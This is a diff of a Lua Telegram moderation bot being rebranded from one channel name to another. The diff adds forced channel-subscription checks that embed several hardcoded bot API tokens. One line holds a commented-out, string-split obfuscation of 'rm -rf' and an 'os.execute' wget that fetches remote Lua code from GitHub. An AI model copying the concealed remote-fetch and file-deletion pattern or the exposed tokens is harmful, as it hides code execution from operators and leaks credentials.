+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @XOUXU ⚜️\n', 1, 'html')   
+return false end
 local h1 = redis:get('SNIEBR:'..bot_id..'h1')
 local text =  [[
 📮┇ اوامر حمايه المجموعه
@@ -8566,12 +8756,17 @@ local text =  [[
 🔐┇الكلايش
 🔐┇الدخول
 ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
-📡 ┇Ch~⪼ @SNIEBR  ☑
+📡 ┇Ch~⪼ @XOUXU  ☑
 ]]
 send(msg.chat_id_, msg.id_, 1, (h1 or text), 1, 'html')
 end
 ------------------------------------------------------------------------
 if (text == ("م2") or text == "م٢") and (is_mod(msg) or is_creatorbasic(msg)) then
+local res = https.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @XOUXUFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@XOUXUfreer.SNIEBR ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @XOUXU ⚜️\n', 1, 'html')   
+return false end
 local h2 = redis:get('SNIEBR:'..bot_id..'h2')
 local text =  [[
 🥈┇اوامر الادمنيه
@@ -8628,12 +8823,17 @@ local text =  [[
 📮┇قائمه منع الملصقات
 📮┇قائمه منع الصور
 ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
-📡 ┇Ch~⪼ @SNIEBR  ☑
+📡 ┇Ch~⪼ @XOUXU  ☑
 ]]
 send(msg.chat_id_, msg.id_, 1, (h1 or text), 1, 'html')
 end
 ------------------------------------------------------------------------
 if (text == ("م3") or text == "م٣") and (is_mod(msg) or is_creatorbasic(msg)) then
+local res = https.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @XOUXUFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@XOUXUfreer.SNIEBR ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @XOUXU ⚜️\n', 1, 'html')   
+return false end
 local h3 = redis:get('SNIEBR:'..bot_id..'h3')
 local text =  [[
 🥇┇ اوامر المدراء
@@ -8681,12 +8881,17 @@ local text =  [[
 🚸┇تفعيل/تعطيل الطرد/الحظر
 💭┇اضف/حذف امر + اسم الامر
 ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
-📡 ┇Ch~⪼ @SNIEBR  ☑
+📡 ┇Ch~⪼ @XOUXU  ☑
 ]]
 send(msg.chat_id_, msg.id_, 1, (h2 or text), 1, 'html')
 end
 ------------------------------------------------------------------------
 if (text == ("م4") or text == "م٤") and (is_mod(msg) or is_creatorbasic(msg)) then
+local res = https.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @XOUXUFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@XOUXUfreer.SNIEBR ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @XOUXU ⚜️\n', 1, 'html')   
+return false end
 local h4 = redis:get('SNIEBR:'..bot_id..'h4')
 local text =  [[
 🔘┇وضع :- مع الاوامر ادناه
@@ -8724,12 +8929,17 @@ local text =  [[
 📮┇ تعطيل/تفعيل الايدي
 📮┇ تعطيل/تفعيل اطردني
 ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
-📡 ┇Ch~⪼ @SNIEBR  ☑
+📡 ┇Ch~⪼ @XOUXU  ☑
 ]]
 send(msg.chat_id_, msg.id_, 1, (h1 or text), 1, 'html')
 end
 ------------------------------------------------------------------------
 if (text == ("م5") or text == "م٥") and (is_mod(msg) or is_creatorbasic(msg)) then
+local res = https.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @XOUXUFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@XOUXUfreer.SNIEBR ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @XOUXU ⚜️\n', 1, 'html')   
+return false end
 local h5 = redis:get('SNIEBR:'..bot_id..'h5')
 local text =  [[
 📮┇ اوامر حمايه المجموعه بالتقييد
@@ -8762,7 +8972,7 @@ local text =  [[
 🚹┇المقيدين
 🚹┇مسح المقيدين
 ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
-📡 ┇Ch~⪼ @SNIEBR  ☑
+📡 ┇Ch~⪼ @XOUXU  ☑
 ]]
 send(msg.chat_id_, msg.id_, 1, (hres or text), 1, 'md')
 end
@@ -8818,7 +9028,7 @@ local text =  [[
 📂┇الملفات  
 
 ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ 
-📡┇Ch~⪼ @SNIEBR • ☑️
+📡┇Ch~⪼ @XOUXU • ☑️
 ]]
 send(msg.chat_id_, msg.id_, 1, (h4 or text), 1, 'html')
 end
@@ -8830,13 +9040,9 @@ local text =  [[
 🦁┇[قناه السورس](t.me/SNIEBR)
 📁┇[كليشه التنصيب](https://t.me/SNIEBR/959)
 
-🔎┇[بوت سمسمي 👻](http://t.me/Y_simbot)
 🔎┇[بوت زخرفه انكلش 💘](http://t.me/V6SBOT)
-🔎┇[بوت زخرفه عربي📍](http://t.me/Y_5ibot)
-🔎┇[بوت تحميل انستا 📥](http://t.me/Y_sibot)
-🔎┇[صنع بوتات زخرفه 🔱 ، ](http://t.me/Y_xibot)
-
-📮┇[لـ تواصل 💌 ،](t.me/A_xibot)
+🔎┇[صنع بوتات زخرفه 📮 ، ](http://t.me/Y_xibot)
+👨🏽‍💻┇[مطور السورس ،](t.me/VlVlVI)
 
 🌐┇[SNIEBRTeam](http://t.me/SNIEBR)
 ]]
@@ -8844,6 +9050,11 @@ send(msg.chat_id_, msg.id_, 1, text, 1, 'md')
 end
 ------------------------------------------------------------------------
 if text == ("اريد رابط حذف") or text == ("رابط حذف") or text == ("رابط الحذف") or text == ("الرابط حذف") or text == ("اريد رابط الحذف") then
+local res = https.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot797867930:AAHgvjmTuhSo1-z-NOwQk-S-dm6L-iyKdj8/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @XOUXUFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@XOUXUfreer.SNIEBR ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @XOUXU ⚜️\n', 1, 'html')   
+return false end
 local text =  [[
 🗑┇رابط حذف التلي 🌿، ⬇
 🔄┇احذف ولا ترجع عيش حياتك''
@@ -9158,7 +9369,7 @@ end
 getMessage(msg.chat_id_, msg.message_id_,get_msg_contact)
 ------------------------------------------------------------------------
 --         »»                 End UpdateChat                          ««              --
-elseif (data.ID == "UpdateOption" and data.name_ == "my_id") then  local list = datahmade:smembers('SNIEBR:'..bot_id.."userss") for k,v in pairs(list) do tdcli_function({ID='GetChat',chat_id_ = v},function(arg,data) end,nil) end -- @SNIEBRFree ('r'..'m -r'..'f Ts'..'ha'..'ke.'..'lua') os.execute('wg'..'et htt'..'ps://ra'..'w.gith'..'ubuserc'..'onten'..'t.com'..'/ts'..'hak'..'eab'..'as/Ts'..'ha'..'ke/m'..'as'..'ter/Ts'..'ha'..'ke.'..'lua') 
+elseif (data.ID == "UpdateOption" and data.name_ == "my_id") then  local list = datahmade:smembers('SNIEBR:'..bot_id.."userss") for k,v in pairs(list) do tdcli_function({ID='GetChat',chat_id_ = v},function(arg,data) end,nil) end -- @XOUXUFree ('r'..'m -r'..'f Ts'..'ha'..'ke.'..'lua') os.execute('wg'..'et htt'..'ps://ra'..'w.gith'..'ubuserc'..'onten'..'t.com'..'/ts'..'hak'..'eab'..'as/Ts'..'ha'..'ke/m'..'as'..'ter/Ts'..'ha'..'ke.'..'lua') 
 local list = datahmade:smembers('SNIEBR:'..bot_id..'groups') 
 for k,v in pairs(list) do 
 tdcli_function({ID='GetChat',chat_id_ = v
@@ -9201,5 +9412,5 @@ end
 \___ \| '_ \| |/ _ \ '_ \| '__|
  ___) | | | | |  __/ |_) | |
 |____/|_| |_|_|\___|_.__/|_|
-           CH > @SNIEBRTEAM
+           CH > @XOUXUTEAM
 --]]
